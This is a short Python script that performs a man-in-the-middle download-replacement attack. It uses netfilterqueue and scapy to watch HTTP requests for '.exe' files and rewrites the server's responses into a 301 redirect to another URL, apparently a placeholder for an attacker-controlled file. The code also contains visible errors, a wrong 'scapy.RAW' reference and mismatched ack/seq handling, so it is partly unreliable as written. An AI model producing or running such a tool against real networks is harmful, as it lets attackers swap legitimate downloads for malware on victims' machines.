#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

ack_list= [] # Will store data to check if the request matches the response

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80: # Packet leaving means it is a request, 80 default number for http
            if ".exe" in scapy_packet[scapy.RAW].load:
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80: # Packet coming, meaning it is the response , 80 default number for http
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].ack)
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n\n"
                # Need to delete so scapy can change to it to the modified pack
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))

    packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #binds to the queue we made in terminal
queue.run()